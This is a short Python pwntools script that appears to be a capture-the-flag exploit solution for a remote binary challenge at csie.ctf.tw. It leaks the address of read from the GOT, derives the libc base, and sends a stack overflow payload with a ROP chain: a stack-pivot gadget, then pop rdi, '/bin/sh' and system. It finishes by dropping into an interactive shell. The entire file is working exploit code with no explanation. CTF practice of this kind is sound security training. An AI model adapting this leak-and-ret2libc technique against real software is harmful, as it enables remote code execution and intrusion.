from pwn import *

host = 'csie.ctf.tw'
port = 10138
y = remote(host,port)

read_got = 0x601030   #6295600
read_offset = 0xf6670
system_offset = 0x45390
bin_sh_offset = 0x18c177

pop_rdi = 0x00000000004008f3
libc_add_rsp = 0x0000000000142a7f #xor eax, eax ; add rsp, 0x48 ; ret

y.sendafter(':',str(read_got))
y.recvuntil('0x')
read_addr = int(y.recvline().strip(),16)
print hex(read_addr)

libc_base = read_addr - read_offset
system = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset

p = 'a' * 0x38
p += p64(libc_add_rsp + libc_base)
p += 'AAAAAAAA'
p += p64(pop_rdi)
p += p64(bin_sh_addr)
p += p64(system)

y.sendline(p)

y.interactive()
